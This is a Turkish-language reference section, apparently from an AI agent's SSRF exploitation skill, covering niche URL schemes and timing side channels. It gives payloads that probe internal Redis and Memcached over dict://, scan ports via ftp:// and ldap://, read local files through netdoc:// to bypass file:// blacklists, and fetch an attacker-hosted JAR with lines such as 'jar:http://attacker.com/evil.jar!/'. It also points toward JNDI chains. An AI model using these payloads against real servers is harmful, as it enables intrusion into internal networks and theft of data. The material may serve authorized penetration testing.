# Niş Protokol Şemaları ve Rate-Limiting Sinyalleri (§12.4–§12.6)

> **Not:** Bu dosyadaki `§X.Y` referansları, orijinal SSRF skill'inin tek parça numaralandırma şemasını birebir korur. Eğer burada başka bir dosyaya ait bir `§` referansı ile karşılaşırsanız, `SKILL.md` içindeki **"Referans Dosyaları ve Bölüm Haritası"** tablosundan hangi dosyaya bakmanız gerektiğini bulabilirsiniz.

> Her profil şu yapıyla organize edilmiştir: Technology/environment
> fingerprint, Payload sözdizimi, Confirmation/impact payload'ları,
> Kısıtlama/savunma notları, Version/Configuration notları. Tüm
> confirmation payload'ları **otomatik "safe" değildir** — hedefe
> göre hassas bilgi/erişim sağlayabilir (bkz. §10.2).

## 12.4 `dict://` — Sınırlı Raw-TCP-Satır Aktarımı (Genel "Servis Probe" DEĞİL)

**Teknik düzeltme — mekanizma netliği kritik:** `dict://` bir "genel
servis probe aracı" değildir. Gerçek mekanizma şudur: curl'ün (ve
yalnızca curl/libcurl'ün — dilin/kütüphanenin **kendi** `dict://`
handler'ı varsa o farklı davranabilir) `dict://` implementasyonu, RFC
2229 DICT protokolünü **tam olarak uygulamaz** — path'teki string'i
büyük ölçüde **olduğu gibi, tek bir satır** olarak hedef host:port'a
TCP üzerinden gönderir. Bu, gopher kadar esnek (çok satırlı/binary)
değildir, ama **hedef port DICT protokolü konuşmuyorsa bile** basit,
tek satırlık bir komut/probe göndermek için kullanılabilir — **DICT
protokolünün kendisinin** Redis/Memcached'i "anladığı" anlamına
gelmez, yalnızca curl'ün path'i ham TCP satırı olarak ilettiği
anlamına gelir:
```
dict://127.0.0.1:11211/stat
dict://127.0.0.1:6379/info
```
Bu örneklerin çalışması **kesin değildir** — hedef servisin tek
satırlık, newline-sonlu bir komutu (curl'ün ilettiği ham hali)
anlayıp anlamadığına bağlıdır (Redis'in `INLINE COMMANDS` desteği
buna izin verir, ama her servis/versiyon için garanti değildir).
**Kullanım önceliği:** Port-probe/banner-grab için önce §12.3'teki
gopher (daha güvenilir, çok satırlı/binary kontrol) tercih edilmeli;
`dict://` yalnızca gopher desteklenmiyorsa ve hedefin tek-satırlık
bir komutu kabul ettiği ayrıca doğrulanmışsa bir alternatif olarak
denenmelidir.

## 12.5 `ftp://`, `tftp://`, `sftp://`, `ldap://`, `jar://`, `netdoc://` — Niş Protokol Şemaları

- **`ftp://`** — Java/PHP gibi bazı dillerde desteklenir, dosya
  listeleme/okuma için kullanılabilir; ayrıca bazı Java tabanlı
  uygulamalarda `ftp://` üzerinden port taraması (bağlantı başarılı/
  başarısız farkı) mümkündür.
  ```
  ftp://internal-host:21/
  ```
- **`ldap://`, `ldaps://`** — özellikle Java ortamlarında (JNDI ile
  birleştiğinde ayrı ve daha kritik bir zincire — JNDI injection/
  deserialization'a — açılabilir, bu skill'in kapsamı dışındadır
  ama SSRF'in bir JNDI lookup'ına giriş noktası olabileceği
  unutulmamalı, port-probe amaçlı kullanılabilir):
  ```
  ldap://127.0.0.1:389/
  ```
- **`jar://` — SÖZDİZİMİ DÜZELTMESİ (önceki sürümde hatalıydı):**
  Java'nın `jar:` URL şeması, `jar://host/...` gibi bir "authority"
  (çift-slash) formatında **değil**, `jar:<tam-URL>!/<entry>`
  formatındadır — şema kısmı zaten kendi içinde tam bir URL taşır:
  ```
  jar:http://attacker.com/evil.jar!/
  jar:file:///tmp/evil.jar!/path/inside/jar
  ```
  SSRF ile birleştiğinde, saldırganın kontrolündeki bir JAR dosyasının
  `jar:http://<canary>/evil.jar!/` ile açılması, hem OOB confirmation
  (JAR indirme isteği canary'ye düşer) hem de (bazı Java
  URLConnection zincirlerinde) JAR içeriğinin işlenmesi potansiyeli
  taşır.
- **`netdoc://` — Belirsizlik notu (önceki sürümde fazla kesin
  yazılmıştı):** Eski/az bilinen bir Java URL şemasıdır
  (`sun.net.www.protocol.netdoc`); bazı **eski** JDK sürümlerinde
  `file://`'a benzer bir yerel dosya erişimi sağladığı bilinir, ama
  bu **JDK sürümüne ve hangi `URLStreamHandler`'ın register edildiğine
  sıkı sıkıya bağlıdır** — modern JDK sürümlerinde bu handler
  kaldırılmış/değiştirilmiş olabilir. Denemeden önce hedefin gerçekte
  hangi JDK sürümünü/handler setini kullandığı fingerprint edilmeye
  çalışılmalı (§7); "çalışır" diye kesin varsayılmamalı, `file://`
  blacklist'i atlatma denemesi olarak yalnızca `file://` doğrudan
  engellenmişse ve düşük maliyetli bir ek deneme olarak düşünülmelidir.
- **Kullanım kuralı:** Bu niş şemaların hepsi dil/kütüphane-özgüdür
  — önce §7 fingerprinting ile hedefin dilini/kütüphanesini tahmin et,
  sonra o dile özgü desteklenen şemaları önceliklendir (örn. Java
  hedefte `jar://`/`netdoc://` denemeye değerken, Python/Node.js
  hedefte bu şemaların hiçbiri muhtemelen desteklenmez).

## 12.6 Rate-Limiting / Retry Davranışı Üzerinden Dolaylı Bilgi Sızıntısı

Bazı HTTP client'lar bir bağlantı hatası aldığında (connection
refused/timeout) **retry** yapar, bazıları yapmaz — bu davranış farkı
(response timing'inde gözlemlenebilir bir "tekrar deneme" gecikmesi),
hedef portun **kesinlikle kapalı** (hemen RST, retry tetiklenmez) mı
yoksa **filtrelenmiş/DROP** (timeout, bazı client'larda retry
tetiklenir) mi olduğunu ayırt etmede ek bir sinyal olarak kullanılabilir
— §7 Fingerprinting'e destekleyici bir teknik.
